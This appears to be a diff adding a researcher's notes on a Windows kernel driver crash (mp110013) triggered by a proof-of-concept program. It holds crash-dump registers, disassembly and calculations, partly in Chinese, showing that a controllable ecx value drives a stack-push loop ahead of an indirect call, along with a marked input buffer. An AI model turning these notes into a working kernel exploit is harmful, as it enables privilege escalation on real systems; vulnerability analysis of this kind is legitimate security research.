@@ -1,0 +1,78 @@
+BUGCHECK_STR:  0x7f_8
+
+TSS:  00000028 -- (.tss 28)
+eax=81111e44 ebx=8110f4c8 ecx=60c38da8 edx=8000012c esi=00000000 edi=811113b8
+eip=f96a37c0 esp=f766f000 ebp=f7671974 iopl=0         nv up ei ng nz na pe nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010286
+mp110013+0x7c0:
+f96a37c0 ff30            push    dword ptr [eax]      ds:0023:81111e44=00000000
+Resetting default scope
+
+DEFAULT_BUCKET_ID:  CODE_CORRUPTION
+
+PROCESS_NAME:  poc.exe
+
+LAST_CONTROL_TRANSFER:  from f96a8c06 to f96a37c0
+
+
+
+
+TSS:  00000028 -- (.tss 28)
+eax=8100a984 ebx=81008008 ecx=aaaaa04d edx=8000012c esi=00000000 edi=811113b8
+eip=f96a37c0 esp=f7637000 ebp=f7639974 iopl=0         nv up ei ng nz na pe nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010286
+mp110013+0x7c0:
+f96a37c0 ff30            push    dword ptr [eax]      ds:0023:8100a984=00000000
+Resetting default scope
+
+DEFAULT_BUCKET_ID:  CODE_CORRUPTION
+
+PROCESS_NAME:  poc.exe
+
+LAST_CONTROL_TRANSFER:  from f96a8c06 to f96a37c0
+
+
+
+60c39805 - 	60c38da8  =A5D
+aaaaaaaa	aaaaa04d  =A5D
+00000003
+
+60c39805	60c38dbf  =A46
+
+
+esp=f7cf1000 ebp=f7cf3918   2918/4=A46   每push一次 ecx-- 并且  esp=esp+4
+60c39805
+ecx=60c38dbf
+eax=8118ed00 
+
+
+esp 原始值为ebp f7cf3918
+esp 最终值为f7cf1000 = ebp - A46 * 4
+
+ecx 原始值为60c39805			可以控制
+ecx 最终值为60c38dbf = 原始值-A46
+
+eax 最终值为8118ed00  反推原始 eax = 8118ed00 - A46 * 4 = 81191618
+
+.text:000107C0                 push    dword ptr [eax]
+.text:000107C2                 add     eax, 4
+.text:000107C5                 loop    loc_107C0
+.text:000107C7                 mov     eax, [ebp+arg_0]
+.text:000107CA                 call    dword ptr [eax]
+
+[ebp+8]=8118c3e0 
+
+
+====fill buffer with random data====
+7B 67 B4 33 [05 98 C3 60][ecx] 8B 68 DD 6F 01 52 5A B5 
+28 14 44 89 78 32 EA 5F 8E 75 6B 22 38 B1 FD 46 
+23 DB AC FB 1D 45 8F 04 73 D9 24 1F 8A 70 A6 D7 
+62 7B C2 36 E7 BB 3A 9D 11 A8 F5 84 8C CA E3 FE 
+49 79 26 0D 61 9A 8D 17 BE 6E 61 57 78 9C A4 C2 
+36 22 8C 56 39 B8 26 54 F1 A0 1E 78 5F D3 DF 98 
+35 66 83 55 DE 14 59 E2 94 C4 DE 31 FC F8 2F 2C 
+12 04 D4 0A EE 0F 95 E2 DC A1 3F B8 13 55 83 D3 
+
+
+
+
